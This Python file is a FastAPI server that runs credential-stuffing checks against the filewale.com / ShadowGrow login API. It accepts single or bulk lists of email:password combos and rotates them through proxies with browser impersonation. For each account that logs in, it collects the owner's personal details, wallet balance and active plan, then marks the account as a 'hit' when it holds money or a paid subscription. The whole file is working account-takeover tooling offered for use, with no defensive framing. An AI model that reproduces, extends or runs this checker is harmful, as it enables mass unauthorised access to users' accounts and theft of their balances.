#!/usr/bin/env python3
"""
Filewale / ShadowGrow — API Server
Single + bulk account checks. Returns wallet, plan, expiry.
"""

import os
import time
from typing import Optional, List, Any
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field
from curl_cffi import requests as cf_requests

# ==================== CONFIG ====================
BASE = "https://filewale.com"
API = BASE + "/api/v1"
PANEL_NAME = "Filewale / ShadowGrow"

TIMEOUT = int(os.getenv("FW_TIMEOUT", "30"))
IMPERSONATE = os.getenv("FW_IMPERSONATE", "chrome")

# ==================== MODELS ====================
class CheckRequest(BaseModel):
    combo: str = Field(..., description="email:password")
    proxy: Optional[str] = Field(None, description="http://user:pass@host:port")

class BulkRequest(BaseModel):
    combos: List[str] = Field(..., description="List of email:password")
    proxy: Optional[str] = None
    threads: int = Field(3, ge=1, le=20)

class PlanInfo(BaseModel):
    name: Optional[str] = None
    status: Optional[str] = None
    start: Optional[str] = None
    end: Optional[str] = None
    price: Optional[float] = None
    currency: Optional[str] = None
    days_left: Optional[int] = None
    max_downloads: Optional[int] = None
    max_bandwidth_gb: Optional[float] = None
    max_devices: Optional[int] = None
    daily_download_limit: Optional[int] = None
    daily_bandwidth_limit_gb: Optional[float] = None
    used_downloads: Optional[int] = None
    used_bandwidth_gb: Optional[float] = None

class WalletInfo(BaseModel):
    balance: Optional[float] = None
    currency: str = "USD"
    available: Optional[float] = None
    locked: Optional[float] = None
    total_credited: Optional[float] = None
    total_debited: Optional[float] = None

class AccountInfo(BaseModel):
    user_id: Optional[Any] = None
    username: Optional[str] = None
    full_name: Optional[str] = None
    country: Optional[str] = None
    city: Optional[str] = None
    email_verified: Optional[bool] = None
    phone_verified: Optional[bool] = None
    twofa: Optional[bool] = None
    created_at: Optional[str] = None

class CheckResponse(BaseModel):
    success: bool
    combo: str
    status: str  # hit | free | bad | error
    reason: str = ""
    panel: str = PANEL_NAME
    account: Optional[AccountInfo] = None
    wallet: Optional[WalletInfo] = None
    plan: Optional[PlanInfo] = None
    hit_reasons: List[str] = []
    error: str = ""

class BulkResponse(BaseModel):
    total: int
    hits: int
    free: int
    bad: int
    errors: int
    elapsed_seconds: float
    results: List[CheckResponse]

# ==================== HELPERS ====================
def _to_float(v):
    try:
        return float(v)
    except Exception:
        return None

def _days_left(plan_end: Optional[str]) -> Optional[int]:
    if not plan_end:
        return None
    try:
        end = datetime.fromisoformat(plan_end.replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        return max(0, (end - now).days)
    except Exception:
        return None

def _build_session(proxy: Optional[str]):
    s = cf_requests.Session(impersonate=IMPERSONATE, timeout=TIMEOUT)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

# ==================== CORE CHECK ====================
def _check(email: str, password: str, proxy: Optional[str] = None) -> CheckResponse:
    combo = f"{email}:{password}"
    s = _build_session(proxy)

    try:
        r = s.post(API + "/auth/login", json={
            "identifier": email,
            "password": password,
        }, headers={
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": BASE,
            "referer": BASE + "/login",
        })
    except Exception as e:
        s.close()
        return CheckResponse(
            success=False, combo=combo, status="error",
            error=f"net_{type(e).__name__}"
        )

    if r.status_code in (401, 403):
        s.close()
        return CheckResponse(success=False, combo=combo, status="bad",
                             error=f"http_{r.status_code}")

    if r.status_code != 200:
        s.close()
        return CheckResponse(success=False, combo=combo, status="error",
                             error=f"http_{r.status_code}")

    try:
        body = r.json()
    except Exception:
        s.close()
        return CheckResponse(success=False, combo=combo, status="error",
                             error="bad_json")

    if not body.get("success"):
        s.close()
        return CheckResponse(success=False, combo=combo, status="bad",
                             error="success_false")

    token = (body.get("data") or {}).get("accessToken")
    if not token:
        s.close()
        return CheckResponse(success=False, combo=combo, status="bad",
                             error="no_token")

    user = (body.get("data") or {}).get("user") or {}
    auth = {"authorization": f"Bearer {token}"}

    # ---- verify token ----
    try:
        ru = s.get(API + "/users/me", headers={
            **auth,
            "accept": "application/json, text/plain, */*",
            "referer": BASE + "/dashboard",
            "x-shadowgrow-auth-critical": "1",
        })
        if ru.status_code == 401:
            s.close()
            return CheckResponse(success=False, combo=combo, status="bad",
                                 error="token_rejected")
        if ru.status_code == 200:
            uj = ru.json()
            if uj.get("success") and uj.get("data"):
                user = uj["data"]
    except Exception:
        pass

    # ---- wallet ----
    wallet = WalletInfo()
    try:
        rb = s.get(API + "/wallet/me/balance", headers={
            **auth,
            "accept": "application/json, text/plain, */*",
            "referer": BASE + "/dashboard/wallet",
        })
        if rb.status_code == 200:
            bd = (rb.json().get("data") or {})
            wallet = WalletInfo(
                balance=bd.get("balance"),
                currency=bd.get("currency", "USD"),
                available=bd.get("availableBalance"),
                locked=bd.get("lockedAmount"),
                total_credited=bd.get("totalCredited"),
                total_debited=bd.get("totalDebited"),
            )
    except Exception:
        pass

    # ---- plan ----
    plan_obj = None
    plan_raw = None
    try:
        rp = s.get(API + "/subscriptions/my-subscription", headers={
            **auth,
            "accept": "application/json, text/plain, */*",
            "referer": BASE + "/dashboard",
        })
        if rp.status_code == 200:
            pj = rp.json()
            if pj.get("success") and pj.get("data"):
                plan_raw = pj["data"]
    except Exception:
        pass

    if plan_raw:
        p = plan_raw.get("plan") or {}
        plan_obj = PlanInfo(
            name=p.get("name"),
            status=plan_raw.get("status"),
            start=plan_raw.get("startDate"),
            end=plan_raw.get("endDate"),
            price=p.get("price"),
            currency=p.get("currency", wallet.currency),
            days_left=_days_left(plan_raw.get("endDate")),
            max_downloads=p.get("maxDownloads"),
            max_bandwidth_gb=p.get("maxBandwidthGB"),
            max_devices=p.get("maxDevices"),
            daily_download_limit=p.get("dailyDownloadLimit"),
            daily_bandwidth_limit_gb=p.get("dailyBandwidthLimitGB"),
            used_downloads=plan_raw.get("downloadCount", 0),
            used_bandwidth_gb=_to_float(plan_raw.get("bandwidthUsedGB")),
        )

    # ---- classify ----
    reasons = []
    if wallet.balance is not None and wallet.balance > 0:
        reasons.append("balance")
    if plan_raw and plan_raw.get("status") == "active":
        reasons.append("plan")

    status = "hit" if reasons else "free"

    account = AccountInfo(
        user_id=user.get("id"),
        username=user.get("username"),
        full_name=user.get("fullName"),
        country=user.get("country"),
        city=user.get("city"),
        email_verified=user.get("emailVerified"),
        phone_verified=user.get("mobileVerified"),
        twofa=user.get("isTwoFactorEnabled"),
        created_at=user.get("createdAt"),
    )

    s.close()

    return CheckResponse(
        success=True,
        combo=combo,
        status=status,
        reason=",".join(reasons) if reasons else "none",
        account=account,
        wallet=wallet,
        plan=plan_obj,
        hit_reasons=reasons,
    )

# ==================== APP ====================
app = FastAPI(title="Filewale / ShadowGrow API", version="1.0.0")

@app.get("/health")
def health():
    return {"status": "ok", "panel": PANEL_NAME,
            "time": datetime.utcnow().isoformat()}

# GET — combo in path, proxy optional via query
@app.get("/check/{combo:path}", response_model=CheckResponse)
def check_get(combo: str, proxy: Optional[str] = None):
    if ":" not in combo:
        raise HTTPException(400, "combo must be email:password")
    email, _, password = combo.partition(":")
    if not email or not password:
        raise HTTPException(400, "empty email or password")
    return _check(email.strip(), password.strip(), proxy=proxy)

# POST — combo in body
@app.post("/check", response_model=CheckResponse)
def check_post(req: CheckRequest):
    if ":" not in req.combo:
        raise HTTPException(400, "combo must be email:password")
    email, _, password = req.combo.partition(":")
    if not email or not password:
        raise HTTPException(400, "empty email or password")
    return _check(email.strip(), password.strip(), proxy=req.proxy)

# Bulk
@app.post("/bulk", response_model=BulkResponse)
def bulk(req: BulkRequest):
    cleaned = []
    for c in req.combos:
        c = c.strip()
        if ":" not in c:
            continue
        u, _, p = c.partition(":")
        if u and p:
            cleaned.append((u.strip(), p.strip()))

    if not cleaned:
        raise HTTPException(400, "no valid combos")

    t0 = time.time()
    results: List[CheckResponse] = []

    with ThreadPoolExecutor(max_workers=req.threads) as ex:
        futures = [ex.submit(_check, u, p, req.proxy) for u, p in cleaned]
        for f in futures:
            results.append(f.result())

    elapsed = time.time() - t0
    hits = sum(1 for r in results if r.status == "hit")
    free = sum(1 for r in results if r.status == "free")
    bad = sum(1 for r in results if r.status == "bad")
    errs = sum(1 for r in results if r.status == "error")

    return BulkResponse(
        total=len(results),
        hits=hits, free=free, bad=bad, errors=errs,
        elapsed_seconds=round(elapsed, 2),
        results=results,
    )

# ==================== ENTRY ====================
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", os.getenv("FW_PORT", "8000")))
    uvicorn.run(app, host="0.0.0.0", port=port)
